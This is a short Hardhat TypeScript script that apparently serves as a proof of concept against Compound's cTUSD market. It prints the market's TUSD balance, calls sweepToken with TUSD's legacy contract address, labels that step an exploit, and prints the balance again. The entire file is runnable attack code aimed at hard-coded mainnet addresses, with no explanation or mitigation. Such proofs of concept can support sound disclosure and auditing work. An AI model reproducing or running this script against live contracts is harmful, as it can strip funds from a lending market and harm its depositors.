import hre from "hardhat"
import {ICErc20Delegate__factory, IERC20__factory} from "../typechain";

async function main() {
  const tusdPrimary = "0x0000000000085d4780b73119b644ae5ecd22b376"
  const tusdLegacy = "0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E"
  const [signer] = await hre.ethers.getSigners()
  const cTUSD = ICErc20Delegate__factory.connect("0x12392F67bdf24faE0AF363c24aC620a2f67DAd86",signer)
  const tusd = IERC20__factory.connect(tusdPrimary,signer)

  console.log("Compound TUSD balance:",hre.ethers.utils.formatUnits(await tusd.balanceOf(cTUSD.address),await tusd.decimals()))
  console.log("Exploiting...")
  await cTUSD.sweepToken(tusdLegacy)
  console.log("Exploit complete.")
  console.log("Compound TUSD balance:",hre.ethers.utils.formatUnits(await tusd.balanceOf(cTUSD.address),await tusd.decimals()))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
